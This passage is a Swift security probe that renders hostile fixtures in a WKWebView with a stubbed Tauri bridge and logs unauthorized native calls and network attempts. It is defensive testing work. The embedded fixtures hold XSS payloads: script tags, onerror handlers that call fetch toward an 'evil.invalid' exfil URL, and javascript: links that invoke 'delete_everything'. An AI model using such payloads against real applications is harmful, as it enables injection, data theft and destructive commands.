// main.swift —— P1-B06-REPAIR-01 隔离原生探针（P1-B06-VERIFY-02 阶段化安全观察版）。
//
// 目的：在真实 WKWebView 中加载【产品同一份 app/ui 资产】（nayanprobe:// 自定义
// scheme 从 ui 目录 serve，模拟 Tauri 本地 asset 协议路线），以服务期同型 CSP 响应头
// 下发，注入最小 TAPI 桩（own_icon/app_icon 返回合成图标），测量品牌/应用图标几何、
// CSP violation、输入行为、树交互，并对【敌意渲染窗口】做结构化安全对账。
// 隔离性：独立可执行、临时非持久 WKWebsiteDataStore、不启动任何产品进程/热键/自启/
// 剪贴板/生产 HTTP 服务、不触碰生产库；仅只读加载产品静态资产。
//
// ⚠️ 边界声明：本探针是「产品 assets + 系统 WKWebView」的模拟服务（自定义 scheme +
// 模拟 CSP 响应头），不是实际 Tauri asset/IPC 服务的整链证明；TAPI 全部返回本地桩值，
// 不执行任何真实原生命令；网络记录器为页面 JS 层接缝（见下），不外发真实请求。
//
// 用法：nayan-native-probe <uiDir> <cspMode> <iconPx> [outJson] [width] [light|dark] [screenshotPath] [sentinel] [inject]
//   cspMode: A=配置串原样  B=历史 hash-only 对照  C=理论风险形态（style-src 追加 hash）
//            N=当前产品 CSP + script hash + 所有 <style> 的 nonce（真实 Tauri 同型）
//   sentinel: 传入 "sentinel" 时注入已知触发的哨兵（观察器正向控制，记录于 observer-controls 阶段）。
//   inject: "bridge"=敌意窗口注入一次未授权模拟原生调用（必败负向控制，抓住则 exit 7；
//            未抓住=观察器缺陷 exit 9）；"transient"=敌意窗口注入瞬时外部网络尝试（抓住
//            exit 8；未抓住 exit 9）。两模式均为本地桩，不执行真实命令/不发真实请求。
//
// ── P1-B06-VERIFY-02 修改清单（在 VERIFY-01 终态上，见批次 baseline/ 存档文本）──
//   [V1-F01] 原生调用记录从平铺 __NATIVE_CALLS__ 改为 __PHASELOG__：每条含
//            phase/seq/cmd/受控参数；阶段= init→body-normal→hostile-window→
//            user-click→observer-controls→teardown。敌意窗口在切走前【封闭结算】
//            （hostileSealed），观察器哨兵不可能污染敌意窗口。
//   [V1-F01] __AUTHZ__ 精确白名单（cmd+method+path 模式+阶段），不是“非 sentinel 都行”；
//            敌意窗口未授权调用必须为 0；探针级门控：正常跑未授权>0 或外部尝试>0 → exit 6。
//   [V1-F02] 新增网络尝试记录器（页面 JS 层接缝，安装于 document start，先于一切产品代码）：
//            fetch 包装、XMLHttpRequest.open 包装、HTMLImageElement.prototype.src 属性
//            setter 包装、Element.prototype.setAttribute 包装（img/script/iframe/link 的
//            src/href）、document MutationObserver（覆盖 innerHTML 解析路径）。同步插入后
//            立即移除仍留痕（记录发生在移除前）。CSP 拦截的尝试同样被记录（接缝在网络层
//            之前）。边界如实声明：不覆盖 CSS url()/video/audio 等其他资源类型；尝试记录
//            在 JS 层，不代表到达服务器。
//   [V1-F02] transient 注入必败控制：敌意窗口内 img 外部 src 同步插入即移除 + fetch 外部
//            URL（.invalid 保留域 + CSP connect-src 拦截，双保险不发真实请求）。
//   [fixture] 新增 id=5 声明 HTML 敌意条目（format:html 走产品 renderRich html 路径）；
//            id=3 markdown 敌意载荷补 TAPI.invoke 企图/onerror fetch 企图/javascript: 链接。
//            fixtureCheck 断言原始 fixture 非空、正文存在、两种格式各自实际生效。
//   [断言配套] 敌意窗口封闭结果/阶段日志/fixtureCheck 全部入 JSON，供 runner 与
//            JSON 注入回放门控使用。
//
// ── P1-B06-VERIFY-01 修改清单（保留，历史）──
//   [缺陷修复] N 模式配置读取失败显式 exit(3)；脚本 hash 提取失败显式 exit(3)。
//   [新增] nonce 注入命中计数/服务文件日志/console 捕获/独立 PNG 解码+损坏负向控制/
//          takeSnapshot 截图（承载窗 orderFrontRegardless+快门前 DOM 诊断）/C 模式违例
//          观察器对照/敌意条目真实渲染（GET :id/content 端点桩）/树交互/图标回退与缓存对照。
//   [平台差异] WKWebView 对 parser 插入的内联脚本派发 securitypolicyviolation（A/C/D 证据），
//          对 DOM 动态插入的不派发——违例观察器正向控制由 C 模式承担。

import Foundation
import WebKit
import CryptoKit
import AppKit

// ---------- 参数 ----------
let args = CommandLine.arguments
guard args.count >= 4 else {
    FileHandle.standardError.write("用法: nayan-native-probe <uiDir> <cspMode A|B|C|D|N> <iconPx> [outJson] [width] [light|dark] [screenshotPath] [sentinel] [inject bridge|transient]\n".data(using: .utf8)!)
    exit(2)
}
let uiDir = URL(fileURLWithPath: args[1]).standardizedFileURL
let cspMode = args[2]
let iconPx = Int(args[3]) ?? 1024
let outJson = args.count > 4 ? args[4] : nil
let viewportWidth = args.count > 5 ? (Double(args[5]) ?? 1280) : 1280
let darkTheme = args.count > 6 && args[6] == "dark"
let screenshotPath = args.count > 7 ? args[7] : nil
let sentinelMode = args.count > 8 && args[8] == "sentinel"
let injectMode = args.count > 9 ? args[9] : ""

func fatalConfig(_ reason: String) -> Never {
    // 显式报错：读取/注入失败不得静默冒充成功
    let out: [String: Any] = ["fatalConfigError": reason, "cspMode": cspMode, "uiDir": uiDir.path]
    let data = try! JSONSerialization.data(withJSONObject: out, options: [.prettyPrinted, .sortedKeys])
    if let p = outJson { try? data.write(to: URL(fileURLWithPath: p)) }
    FileHandle.standardError.write(String(data: data, encoding: .utf8)!.data(using: .utf8)!)
    exit(3)
}

let configCSP = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost; base-uri 'self'"
let configURL = uiDir.deletingLastPathComponent().appendingPathComponent("src-tauri/tauri.conf.json")
var configSource: [String: Any] = ["path": configURL.path, "readOk": false]
var productCSP: String
if cspMode == "N" {
    guard let cfgData = FileManager.default.contents(atPath: configURL.path),
          let cfg = try? JSONSerialization.jsonObject(with: cfgData),
          let app = (cfg as? [String: Any])?["app"] as? [String: Any],
          let sec = app["security"] as? [String: Any],
          let cspStr = sec["csp"] as? String, !cspStr.isEmpty else {
        fatalConfig("N 模式无法从 \(configURL.path) 读取 app.security.csp（文件缺失/结构不符/空串）")
    }
    productCSP = cspStr
    configSource = ["path": configURL.path, "readOk": true, "cspLength": cspStr.count]
} else {
    productCSP = configCSP
}
func currentScriptHash() -> String? {
    guard let html = try? String(contentsOf: uiDir.appendingPathComponent("index.html"), encoding: .utf8),
          let start = html.range(of: "<script>"),
          let end = html.range(of: "</script>", range: start.upperBound..<html.endIndex) else { return nil }
    var script = String(html[start.upperBound..<end.lowerBound])
    script = script.replacingOccurrences(of: "\r\n", with: "\n").replacingOccurrences(of: "\r", with: "\n")
    let digest = SHA256.hash(data: script.data(using: .utf8)!)
    return "'sha256-" + Data(digest).base64EncodedString() + "'"
}
let scriptHashOpt = currentScriptHash()
if cspMode == "N" || cspMode == "B" || cspMode == "D" {
    guard scriptHashOpt != nil else {
        fatalConfig("cspMode \(cspMode) 需要内联脚本 hash，但在 \(uiDir.path)/index.html 中未找到 <script>…</script> 块")
    }
}
let scriptHash = scriptHashOpt ?? "'sha256-UNAVAILABLE'"
var csp = configCSP
switch cspMode {
case "A": csp = configCSP
case "B": csp = configCSP.replacingOccurrences(of: "script-src 'self';", with: "script-src 'self' \(scriptHash);")
case "C": csp = configCSP.replacingOccurrences(of: "style-src 'self' 'unsafe-inline';", with: "style-src 'self' 'unsafe-inline' 'sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';")
case "D": csp = configCSP
    .replacingOccurrences(of: "script-src 'self';", with: "script-src 'self' \(scriptHash);")
    .replacingOccurrences(of: "style-src 'self' 'unsafe-inline';", with: "style-src 'self' 'unsafe-inline' 'sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';")
case "N":
    guard productCSP.contains("script-src 'self';") else {
        fatalConfig("N 模式产品 CSP 缺少 script-src 'self'; 段，无法注入脚本 hash：\(productCSP)")
    }
    guard productCSP.contains("style-src 'self' 'unsafe-inline';") else {
        fatalConfig("N 模式产品 CSP 缺少 style-src 'self' 'unsafe-inline'; 段，无法注入 style nonce：\(productCSP)")
    }
    csp = productCSP
    .replacingOccurrences(of: "script-src 'self';", with: "script-src 'self' \(scriptHash);")
    .replacingOccurrences(of: "style-src 'self' 'unsafe-inline';", with: "style-src 'self' 'unsafe-inline' 'nonce-nayan-probe-style';")
default:
    FileHandle.standardError.write("未知 cspMode \(cspMode)\n".data(using: .utf8)!); exit(2)
}

// ---------- 合成图标 ----------
func syntheticIconPNG(px: Int) -> String {
    let w = px, h = px
    var rgba = [UInt8](repeating: 0, count: w * h * 4)
    for y in 0..<h {
        for x in 0..<w {
            let i = (y * w + x) * 4
            let stripe = ((x + y) / 8) % 2 == 0
            rgba[i] = stripe ? 30 : 22; rgba[i+1] = stripe ? 34 : 26
            rgba[i+2] = stripe ? 44 : 36; rgba[i+3] = 255
        }
    }
    func crc32(_ data: [UInt8]) -> UInt32 {
        var c: UInt32 = 0xFFFFFFFF
        let table: [UInt32] = (0..<256).map { i -> UInt32 in
            var v = UInt32(i)
            for _ in 0..<8 { v = (v & 1 == 1) ? (0xEDB88320 ^ (v >> 1)) : (v >> 1) }
            return v
        }
        for b in data { c = table[Int((c ^ UInt32(b)) & 0xFF)] ^ (c >> 8) }
        return c ^ 0xFFFFFFFF
    }
    func chunk(_ type: String, _ data: [UInt8]) -> [UInt8] {
        var out = [UInt8]()
        let len = UInt32(data.count).bigEndian
        withUnsafeBytes(of: len) { out.append(contentsOf: $0) }
        out.append(contentsOf: type.utf8)
        out.append(contentsOf: data)
        withUnsafeBytes(of: crc32(Array(out[4...])).bigEndian) { out.append(contentsOf: $0) }
        return out
    }
    var ihdr = [UInt8]()
    for v in [UInt32(w).bigEndian, UInt32(h).bigEndian] { withUnsafeBytes(of: v) { ihdr.append(contentsOf: $0) } }
    ihdr.append(contentsOf: [8, 6, 0, 0, 0])
    var raw = [UInt8]()
    let strideBytes = w * 4
    for y in 0..<h {
        raw.append(0)
        raw.append(contentsOf: rgba[(y * strideBytes)..<((y+1) * strideBytes)])
    }
    var idat = [UInt8](arrayLiteral: 0x78, 0x01)
    var offset = 0
    while offset < raw.count {
        let n = min(65535, raw.count - offset)
        let final = offset + n >= raw.count
        idat.append(final ? 1 : 0)
        let nl = UInt16(n), nn = ~UInt16(n)
        withUnsafeBytes(of: nl.littleEndian) { idat.append(contentsOf: $0) }
        withUnsafeBytes(of: nn.littleEndian) { idat.append(contentsOf: $0) }
        idat.append(contentsOf: raw[offset..<(offset+n)])
        offset += n
    }
    let a32 = crc32(raw)
    withUnsafeBytes(of: a32.bigEndian) { idat.append(contentsOf: $0) }
    var png = [UInt8](arrayLiteral: 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A)
    png.append(contentsOf: chunk("IHDR", ihdr))
    png.append(contentsOf: chunk("IDAT", idat))
    png.append(contentsOf: chunk("IEND", []))
    return "data:image/png;base64," + Data(png).base64EncodedString()
}

let iconDataURL = syntheticIconPNG(px: iconPx)
let appIconDataURL = syntheticIconPNG(px: 32)

// ---------- 独立解码证据 + 损坏 PNG 负向控制 ----------
func decodePNGDataURL(_ dataURL: String) -> [String: Any] {
    guard let rng = dataURL.range(of: "base64,") else { return ["decodeOk": false, "error": "not a base64 data URL"] }
    let b64 = String(dataURL[rng.upperBound...])
    guard let pngData = Data(base64Encoded: b64) else { return ["decodeOk": false, "error": "base64 decode failed"] }
    let sha = SHA256.hash(data: pngData).map { String(format: "%02x", $0) }.joined()
    guard let rep = NSBitmapImageRep(data: pngData) else { return ["decodeOk": false, "sha256": sha, "bytes": pngData.count, "error": "NSBitmapImageRep 无法解码"] }
    return ["decodeOk": true, "width": rep.pixelsWide, "height": rep.pixelsHigh, "sha256": sha, "bytes": pngData.count]
}
let iconDecodeMain = decodePNGDataURL(iconDataURL)
var corruptDataURL = ""
do {
    let small = syntheticIconPNG(px: 32)
    if let rng = small.range(of: "base64,"), var pngData = Data(base64Encoded: String(small[rng.upperBound...])) {
        for i in 0..<8 { pngData[i] = 0x00 }
        corruptDataURL = "data:image/png;base64," + pngData.base64EncodedString()
    }
}
let iconDecodeCorrupt: [String: Any] = {
    guard let rng = corruptDataURL.range(of: "base64,"), let d = Data(base64Encoded: String(corruptDataURL[rng.upperBound...])) else {
        return ["decodeOk": false, "control": "corrupt data URL not built"]
    }
    return ["decodeOk": NSBitmapImageRep(data: d) != nil, "control": "png signature zeroed (8 bytes)"]
}()

// ---------- 服务文件日志 + nonce 注入命中计数 ----------
final class ProbeShared {
    var servedFiles: [[String: Any]] = []
    var styleBlocksTotal = 0
    var nonceInjected = 0
    var inlineScriptBlocks = 0
    var htmlServed = 0
}
let shared = ProbeShared()

// ---------- 自定义 scheme handler ----------
final class ProbeSchemeHandler: NSObject, WKURLSchemeHandler {
    func webView(_ webView: WKWebView, start task: WKURLSchemeTask) {
        let url = task.request.url!
        let rel = url.path.isEmpty || url.path == "/" ? "/index.html" : url.path
        let file = uiDir.appendingPathComponent(String(rel.dropFirst()))
        guard FileManager.default.fileExists(atPath: file.path) else {
            task.didFailWithError(NSError(domain: NSURLErrorDomain, code: NSURLErrorFileDoesNotExist))
            return
        }
        guard var data = FileManager.default.contents(atPath: file.path) else {
            task.didFailWithError(NSError(domain: NSURLErrorDomain, code: NSURLErrorCannotOpenFile)); return
        }
        let ext = file.pathExtension.lowercased()
        if cspMode == "N", ext == "html", let html = String(data: data, encoding: .utf8) {
            let regex = try! NSRegularExpression(pattern: "<style(?=[\\s>])")
            let nsRange = NSRange(html.startIndex..<html.endIndex, in: html)
            let hits = regex.numberOfMatches(in: html, range: nsRange)
            let mutated = regex.stringByReplacingMatches(in: html, range: nsRange, withTemplate: "<style nonce=\"nayan-probe-style\"")
            if shared.htmlServed == 0 {
                shared.styleBlocksTotal = hits
                shared.nonceInjected = hits
                shared.inlineScriptBlocks = html.components(separatedBy: "</script>").count - 1
            }
            data = Data(mutated.utf8)
        }
        let mime = ["html": "text/html", "js": "application/javascript", "css": "text/css",
                    "png": "image/png", "svg": "image/svg+xml", "woff2": "font/woff2"][ext] ?? "application/octet-stream"
        var headers = [String: String]()
        headers["Content-Type"] = mime
        if ext == "html" { headers["Content-Security-Policy"] = csp }
        let resp = HTTPURLResponse(url: url, statusCode: 200, httpVersion: "HTTP/1.1", headerFields: headers)!
        task.didReceive(resp)
        task.didReceive(data)
        task.didFinish()
        shared.servedFiles.append(["path": rel, "status": 200, "bytes": data.count])
        if ext == "html" { shared.htmlServed += 1 }
    }
    func webView(_ webView: WKWebView, stop urlSchemeTask: WKURLSchemeTask) {}
}

// ---------- 运行 ----------
final class Probe: NSObject, WKNavigationDelegate {
    let web: WKWebView
    var hostWindow: NSWindow?
    var violations: [[String: Any]] = []
    var consoles: [String] = []

    override init() {
        let cfg = WKWebViewConfiguration()
        cfg.setURLSchemeHandler(ProbeSchemeHandler(), forURLScheme: "nayanprobe")
        cfg.websiteDataStore = WKWebsiteDataStore.nonPersistent()
        let prefs = WKPreferences()
        prefs.javaScriptEnabled = true
        cfg.preferences = prefs
        // ============ 桩与观察器（document start，先于一切产品代码） ============
        let stub = """
        // ---- 敌意 fixture（挂到 window 供 fixtureCheck 核对原始非空） ----
        window.__HOSTILE_MD__ = '# 敌意甲\\n<script>window.__PWNED__=1</script>\\n<img src=x onerror="window.__PWNED_IMG__=1;TAPI.invoke(\\'open_path\\',{path:\\'/private/tmp/pwn-md\\'})">\\n<span style="color:red">styled</span>\\n![r](https://evil.invalid/x.png)\\n<img src=y onerror="fetch(\\'https://evil.invalid/md-exfil\\')">\\n[危险链接](javascript:TAPI.invoke(\\'delete_everything\\',{}))\\n\\n```\\ncode 原文 · Unicode ✓\\n  缩进保留\\tTab\\n```\\n\\n正文尾';
        window.__HOSTILE_HTML__ = '<p>声明 HTML 条目</p><strong>白名单标签保留</strong><script>window.__PWNED_HTML__=1</script><img src="https://evil.invalid/html.png" onerror="TAPI.invoke(\\'open_path\\',{path:\\'/private/tmp/pwn-html\\'})"><span style="color:red" onclick="TAPI.invoke(\\'open_path\\',{path:\\'/private/tmp/pwn-click\\'})">styled</span><a href="javascript:TAPI.invoke(\\'delete_all\\',{})">危险链接</a><a href="https://example.com/ok">安全外链</a><iframe src="https://evil.invalid/frame"></iframe>';
        window.__EXPECTED_CODE__ = 'code 原文 · Unicode ✓\\n  缩进保留\\tTab\\n';
        window.__EXPECTED_STRONG__ = '白名单标签保留';
        // ---- 阶段化日志（V1-F01/V1-F02 核心） ----
        window.__PHASE__ = 'init';
        window.__PHASELOG__ = { seq: 0, native: [], net: [] };
        function __rec(kind, entry) {
          entry.phase = window.__PHASE__; entry.seq = ++window.__PHASELOG__.seq;
          // 本地图标为 5.6MB 级 data: URL——截断超长目标（保留 scheme 前缀供分类），
          // 否则 stdout JSON 超 1MB 会让 node execFileSync ENOBUFS。
          if (kind === 'net' && entry.url && entry.url.length > 200) {
            entry.url = String(entry.url).slice(0, 140) + '…[len=' + entry.url.length + '，base64 已截断]';
          }
          window.__PHASELOG__[kind].push(entry);
        }
        // 精确白名单：cmd+method+path 模式+阶段。不是“非 sentinel_native 都行”，
        // 也不是 api 全放行。口径：图标/只读 API=正常 UI 读取通道，任意阶段放行
        // （敌意条目渲染走与正常条目完全相同的读取通道，这是产品语义）；open_path
        // （外链打开）仅限 user-click 阶段——敌意窗口内没有用户点击，内容驱动的
        // open_path 即未授权；一切写操作（PATCH/POST/…）与未知 cmd 一律未授权。
        window.__AUTHZ__ = function(e) {
          if (e.cmd === 'js_log') return true;
          if (e.cmd === 'own_icon' || e.cmd === 'app_icon') return true;
          if (e.cmd === 'open_path') return e.phase === 'user-click';
          if (e.cmd === 'api') {
            if (e.method !== 'GET') return false;
            var p = String(e.path || '');
            if (p === '/api/suggestions' || p === '/api/projects' || p === '/api/session-aliases') return true;
            if (/^\\/api\\/suggestions\\/\\d+\\/(content|reader|attachments)$/.test(p)) return true;
            return false;
          }
          return false;
        };
        window.__EXTERNAL_URL__ = function(u) {
          var s = String(u || '');
          return /^https?:\\/\\//i.test(s) || /^wss?:\\/\\//i.test(s) || s.indexOf('//') === 0;
        };
        // ---- 网络尝试记录器（页面 JS 层接缝；记录先于浏览器网络层，CSP 拦截亦有留痕） ----
        (function() {
          try {
            var of = window.fetch ? window.fetch.bind(window) : null;
            if (of) window.fetch = function(input, init) {
              __rec('net', { type: 'fetch', url: String(input && input.url !== undefined ? input.url : input) });
              return of(input, init);
            };
          } catch (e) {}
          try {
            var oo = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(m, u) {
              __rec('net', { type: 'xhr', method: String(m), url: String(u) });
              return oo.apply(this, arguments);
            };
          } catch (e) {}
          try {
            var d = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
            if (d && d.set) Object.defineProperty(HTMLImageElement.prototype, 'src', {
              configurable: true, enumerable: d.enumerable,
              get: function() { return d.get.call(this); },
              set: function(v) { __rec('net', { type: 'img-src', url: String(v) }); return d.set.call(this, v); }
            });
          } catch (e) {}
          try {
            var osa = Element.prototype.setAttribute;
            Element.prototype.setAttribute = function(n, v) {
              try {
                var t = String(this.tagName || '').toUpperCase();
                if ((n === 'src' || n === 'href') && (t === 'IMG' || t === 'SCRIPT' || t === 'IFRAME' || t === 'LINK'))
                  __rec('net', { type: 'attr-' + t.toLowerCase() + '-' + n, url: String(v) });
              } catch (e2) {}
              return osa.call(this, n, v);
            };
          } catch (e) {}
          try {
            function __scanRes(n) {
              try {
                var t = String(n.tagName || '').toUpperCase();
                if (t === 'IMG' || t === 'SCRIPT' || t === 'IFRAME') {
                  var s = n.getAttribute && n.getAttribute('src');
                  if (s) __rec('net', { type: 'dom-' + t.toLowerCase() + '-src', url: String(s) });
                } else if (t === 'LINK') {
                  var h = n.getAttribute && n.getAttribute('href');
                  if (h) __rec('net', { type: 'dom-link-href', url: String(h) });
                }
                if (n.querySelectorAll) {
                  Array.prototype.forEach.call(n.querySelectorAll('img[src],script[src],iframe[src],link[href]'), __scanRes);
                }
              } catch (e) {}
            }
            var mo = new MutationObserver(function(muts) {
              muts.forEach(function(mu) {
                Array.prototype.forEach.call(mu.addedNodes, function(n) { if (n && n.nodeType === 1) __scanRes(n); });
              });
            });
            mo.observe(document, { childList: true, subtree: true });
          } catch (e) {}
        })();
        // ---- TAPI 桩（全部本地返回；任何真实原生命令都不执行） ----
        window.__TAURI__ = { core: { invoke: function(cmd, args) {
          __rec('native', { cmd: String(cmd), name: args && args.name !== undefined ? String(args.name) : undefined,
            method: args && args.method !== undefined ? String(args.method) : undefined,
            path: args && args.path !== undefined ? String(args.path) : undefined });
          if (cmd === 'own_icon') return Promise.resolve('\(iconDataURL)');
          if (cmd === 'app_icon') {
            if (args && args.name === 'probe-tool-empty') return Promise.resolve('');
            return Promise.resolve('\(appIconDataURL)');
          }
          if (cmd === 'js_log') return Promise.resolve(null);
          if (cmd === 'api') {
            if (args && args.path === '/api/suggestions' && args.method === 'GET') {
              return Promise.resolve([
                { id: 1, title: '合成条目甲', quote: '合成正文一行', status: 'inbox', kind: 'suggestion',
                  source_tool: 'probe-tool-a', workspace: '/w/alpha', session_ref: '窗口：A', window_id: 7, created_at: '2026-09-30 10:00:00' },
                { id: 2, title: '合成条目乙', quote: '合成正文二行', status: 'inbox', kind: 'suggestion',
                  source_tool: 'probe-tool-b', workspace: '', session_ref: '', window_id: 0, created_at: '2026-09-30 10:01:00' },
                { id: 3, title: '敌意条目(MD)', status: 'inbox', kind: 'suggestion',
                  source_tool: 'probe-tool-a', workspace: '', session_ref: '', window_id: 0, created_at: '2026-09-30 10:02:00' },
                { id: 4, title: '无图标条目', quote: '无图标正文', status: 'inbox', kind: 'suggestion',
                  source_tool: 'probe-tool-empty', workspace: '', session_ref: '', window_id: 0, created_at: '2026-09-30 10:03:00' },
                { id: 5, title: '敌意条目(HTML)', status: 'inbox', kind: 'suggestion',
                  source_tool: 'probe-tool-a', workspace: '', session_ref: '', window_id: 0, created_at: '2026-09-30 10:04:00' }
              ]);
            }
            if (args && args.path === '/api/suggestions/3/content' && args.method === 'GET') {
              return Promise.resolve({ content: { schema_version: 1, request_id: 'probe-md', format: 'markdown',
                format_provenance: 'declared', acquisition: 'manual',
                original: { kind: 'text', text: window.__HOSTILE_MD__ }, fidelity: { truncated: false },
                canonical: window.__HOSTILE_MD__, canonical_unavailable_reason: null,
                plain_projection: { status: 'available', text: '' } }, quote: '' });
            }
            // P1-B06-NATIVE-PAYLOAD-01: reader view stubs derived from the same envelopes.
            function __viewFromEnv(id, e) { return { reader_view_version: 1, id: id, request_id: e.request_id, format: e.format, format_provenance: e.format_provenance, original_kind: e.original.kind, truncated: !!e.fidelity.truncated, canonical: e.canonical, canonical_unavailable_reason: e.canonical_unavailable_reason }; }
            if (args && args.path === '/api/suggestions/3/reader' && args.method === 'GET') {
              return Promise.resolve(__viewFromEnv(3, { request_id: 'probe-md', format: 'markdown', format_provenance: 'declared', original: { kind: 'text' }, fidelity: { truncated: false }, canonical: window.__HOSTILE_MD__, canonical_unavailable_reason: null }));
            }
            if (args && args.path === '/api/suggestions/5/reader' && args.method === 'GET') {
              return Promise.resolve(__viewFromEnv(5, { request_id: 'probe-html', format: 'html', format_provenance: 'declared', original: { kind: 'text' }, fidelity: { truncated: false }, canonical: window.__HOSTILE_HTML__, canonical_unavailable_reason: null }));
            }
            if (args && args.path === '/api/suggestions/5/content' && args.method === 'GET') {
              return Promise.resolve({ content: { schema_version: 1, request_id: 'probe-html', format: 'html',
                format_provenance: 'declared', acquisition: 'manual',
                original: { kind: 'text', text: window.__HOSTILE_HTML__ }, fidelity: { truncated: false },
                canonical: window.__HOSTILE_HTML__, canonical_unavailable_reason: null,
                plain_projection: { status: 'available', text: '' } }, quote: '' });
            }
            if (args && args.path === '/api/projects' && args.method === 'GET') return Promise.resolve([]);
            if (args && args.path === '/api/session-aliases' && args.method === 'GET') return Promise.resolve([]);
            return Promise.resolve(null);
          }
          return Promise.resolve(null);
        }, }, event: { listen: function() {} } };
        window.__VIOLATIONS__ = [];
        window.__CONSOLES__ = [];
        ['log','warn','error'].forEach(function(m){ var orig = console[m] ? console[m].bind(console) : function(){};
          console[m] = function(){ try { window.__CONSOLES__.push(m + ': ' + Array.prototype.map.call(arguments, function(a){ return typeof a === 'string' ? a : String(a); }).join(' ').slice(0, 200)); } catch(e){} orig.apply(null, arguments); }; });
        window.addEventListener('error', function(e){ try { window.__CONSOLES__.push('pageerror: ' + String(e.message || '').slice(0, 200)); } catch(_){} });
        window.addEventListener('securitypolicyviolation', function(e) {
          window.__VIOLATIONS__.push({ directive: e.violatedDirective, uri: String(e.blockedURI||'').slice(0,60), sample: String(e.sample||'').slice(0,80) });
        });
        (function() { // 损坏 PNG 负向控制
          var im = new Image();
          window.__CORRUPT_IMG__ = { done: false, error: false, naturalWidth: -1 };
          im.onload = function(){ window.__CORRUPT_IMG__.done = true; window.__CORRUPT_IMG__.naturalWidth = im.naturalWidth; };
          im.onerror = function(){ window.__CORRUPT_IMG__.done = true; window.__CORRUPT_IMG__.error = true; window.__CORRUPT_IMG__.naturalWidth = im.naturalWidth; };
          im.src = '\(corruptDataURL)';
        })();
        """
        let userScript = WKUserScript(source: stub, injectionTime: .atDocumentStart, forMainFrameOnly: true)
        cfg.userContentController.addUserScript(userScript)
        web = WKWebView(frame: NSRect(x: 0, y: 0, width: viewportWidth, height: 800), configuration: cfg)
        super.init()
        web.navigationDelegate = self
        // 承载窗不打扰用户：窗口仍真实上屏（挪到屏幕外时 WebKit 不绘制被视为遮挡的区域，截图会缺内容），
        // 但完全透明、不接鼠标，用户看不见也点不到。
        let win = NSWindow(contentRect: NSRect(x: 0, y: 0, width: viewportWidth, height: 800),
                           styleMask: [.borderless], backing: .buffered, defer: false)
        win.contentView = web
        win.isMovable = false
        win.alphaValue = 0
        win.ignoresMouseEvents = true
        win.orderFrontRegardless()
        hostWindow = win
    }

    func run() {
        web.load(URLRequest(url: URL(string: "nayanprobe://local/index.html")!))
        DispatchQueue.main.asyncAfter(deadline: .now() + 20) { self.emit(["fatal": "navigation timeout"], exitCode: 0) }
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) { self.measurePhase1() }
    }
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        emit(["fatal": error.localizedDescription], exitCode: 0)
    }

    static let jsInfoHelper = """
      function info(sel){
        var el = document.querySelector(sel);
        if(!el) return null;
        var img = el.querySelector('img');
        var r = el.getBoundingClientRect();
        var out = { sel: sel, container: { w: r.width, h: r.height },
                    hasImg: !!img };
        if(img){
          var ir = img.getBoundingClientRect();
          var cs = getComputedStyle(img);
          out.img = { naturalWidth: img.naturalWidth, naturalHeight: img.naturalHeight,
            complete: img.complete,
            rectW: ir.width, rectH: ir.height, computedW: cs.width, computedH: cs.height,
            styleAttr: (img.getAttribute('style')||'').slice(0,80),
            computedObjectFit: cs.objectFit };
        }
        return out;
      }
    """

    // 阶段 1：body-normal——正常条目详情/新建面板全部同步检查；末尾切入敌意窗口渲染条目 3
    func measurePhase1() {
        let js = """
        (function(){
          \(Probe.jsInfoHelper)
          window.__PHASE__ = 'body-normal';
          var uiChecks = {};
          document.body.classList.toggle('dark', \(darkTheme ? "true" : "false"));
          if (typeof renderDetail === 'function') {
            state.view = { t: 'triage' }; renderAll(false);   // 默认首页改为钉板后，钉板下详情栏隐藏；量详情前先进入阅读整理视图
            state.sel = 1; state.pane = { mode: 'entry' }; renderDetail();
            paintIcon('probe-tool-a', '\(iconDataURL)');   // 第四版品牌位是纯 CSS 白瓷标，不再有 img 可借；直接用合成图标
            var chip = document.querySelector('.dmeta .mchip');
            uiChecks.sourceName = chip && chip.textContent.indexOf('probe-tool-a') >= 0;
            uiChecks.chipAvatar = info('.dmeta .mchip .av');   // 第四版来源头像：字母方块（无 img）
            var av = document.querySelector('.dmeta .mchip .av');
            uiChecks.chipAvatarLetter = av ? av.textContent : null;
            var rv = document.querySelector('[data-reveal="fNote"]'); if (rv) rv.click();   // 第四版阅读页：空备注默认收起，点「＋ 我的想法」展开后再量
            var ta = document.querySelector('#d-note');
            var detailField = getComputedStyle(ta);
            var detailRadius = detailField.borderRadius, detailBackground = detailField.backgroundColor;
            uiChecks.resize = getComputedStyle(ta).resize;
            var shortH = ta.offsetHeight;
            ta.value = Array(9).join('自动增高\\n'); ta.dispatchEvent(new Event('input', { bubbles: true }));
            uiChecks.grows = ta.offsetHeight > shortH;
            ta.value = Array(100).join('长文本\\n'); ta.dispatchEvent(new Event('input', { bubbles: true }));
            uiChecks.capped = ta.offsetHeight <= 240 && ta.scrollHeight > ta.clientHeight;
            ta.value = ''; ta.dispatchEvent(new Event('input', { bubbles: true }));
            uiChecks.shrinks = ta.offsetHeight === shortH;
            uiChecks.noHorizontalOverflow = document.documentElement.scrollWidth <= innerWidth;
            state.pane = { mode: 'add' }; renderDetail();
            uiChecks.addTextareaResize = Array.from(document.querySelectorAll('.fpanel textarea')).every(function(el){ return getComputedStyle(el).resize === 'none'; });
            uiChecks.newQuoteVisible = document.querySelector('#f-quote').offsetHeight >= 64;
            uiChecks.hiddenFocusStrip = getComputedStyle(document.querySelector('#focusStrip')).display === 'none';
            var newField = getComputedStyle(document.querySelector('#f-note'));
            uiChecks.uniformFields = newField.borderRadius === detailRadius && newField.backgroundColor === detailBackground;
            var inline = document.createElement('span'); inline.setAttribute('style','display:none');
            document.body.appendChild(inline);
            uiChecks.inlineStyleApplied = getComputedStyle(inline).display === 'none'; inline.remove();
          }
          var phase1 = { uiChecks: uiChecks, brand: info('.brand .logo') };
